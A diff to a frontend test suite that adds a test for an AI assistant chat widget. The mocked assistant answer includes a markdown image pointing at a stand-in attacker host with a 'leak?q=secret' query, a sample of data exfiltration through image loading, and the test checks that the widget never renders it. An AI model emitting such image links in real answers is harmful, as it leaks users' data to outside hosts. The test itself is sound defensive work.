@@ -81,6 +81,19 @@ describe('AssistantWidget', () => {
     expect(document.querySelector('.mantine-Badge-root')).toBeNull();
   });
 
+  it('never loads images from an answer and opens links in a new tab without a referrer', async () => {
+    const answer = 'See ![x](https://evil.example/leak?q=secret) and [the guide](https://help.example/guide).';
+    server.use(enabled, antiforgeryHandler(), http.post('/api/assistant/messages', () => sse({ type: 'text_delta', text: answer }, { type: 'done' })));
+    renderWithProviders(<AssistantWidget />);
+
+    await ask('How do I switch to another organisation?');
+
+    const link = await screen.findByRole('link', { name: 'the guide' });
+    expect(link).toHaveAttribute('target', '_blank');
+    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
+    expect(document.querySelector('img[src*="evil.example"]')).toBeNull();
+  });
+
   it('shows the server reason when a turn is refused', async () => {
     server.use(
       enabled,
